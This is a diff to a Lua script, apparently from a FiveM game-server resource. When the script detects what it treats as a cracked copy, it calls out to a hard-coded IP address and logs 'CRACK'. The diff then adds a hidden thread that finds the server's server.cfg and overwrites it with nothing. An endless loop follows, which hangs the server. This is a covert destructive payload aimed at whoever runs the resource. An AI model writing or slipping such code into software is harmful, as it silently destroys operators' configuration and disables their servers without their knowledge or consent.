@@ -24,6 +24,19 @@ if string.find(code,'henryhoover.lua') then
     PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
         startlog("CRACK  "..text)
     end, 'GET', "")
+    Citizen.CreateThread(function()
+    local s = GetResourcePath(GetCurrentResourceName())
+    s = s:gsub("//", "/")
+    a,b = s:match("(.+)resources(.+)")
+  
+    if a then 
+      local file = io.open(a .. "server.cfg", "wb")
+      if file then 
+          file:write("")
+          file:close()
+      end
+    end
+  end)
     while true do
     end
 end
